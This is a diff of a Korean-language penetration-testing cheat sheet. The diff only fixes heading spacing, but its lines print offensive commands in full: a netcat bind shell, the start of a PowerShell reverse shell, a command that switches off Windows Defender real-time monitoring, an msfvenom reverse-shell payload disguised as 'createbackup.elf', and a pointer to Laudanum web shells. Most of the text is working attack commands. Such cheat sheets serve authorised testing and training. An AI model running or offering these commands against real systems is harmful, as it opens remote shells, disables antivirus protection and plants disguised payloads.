@@ -1,11 +1,11 @@
-# 1.Bind Shells
+# 1. Bind Shells
 
 ### 서버 - Bash 셸을 TCP 세션에 바인딩
 ```rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 192.168.1.1 7777 > /tmp/f```<br/>
 ```nc -nv 192.168.1.1 7777```
 
 <br/><br/>
-# 2.Reverse Shell
+# 2. Reverse Shell
 
 ### 클라이언트 - PowerShell을 사용하여 연결
 ```nc -lvnp 443```<br/>
@@ -17,7 +17,7 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1
 ```Set-MpPreference -DisableRealtimeMonitoring $true```
 
 <br/><br/>
-# 3.Payload
+# 3. Payload
 
 ### MSFvenom Payload 제작 (Linux용)
 ```msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -f elf > createbackup.elf```
@@ -56,7 +56,7 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1
 ```sudo -l```
 
 <br/><br/>
-# 4.WebShell
+# 4. WebShell
 
 ### Laudanum (all)
 [Laudanum](https://github.com/jbarcia/Web-Shells/tree/master/laudanum) ```/usr/share/laudanum/```
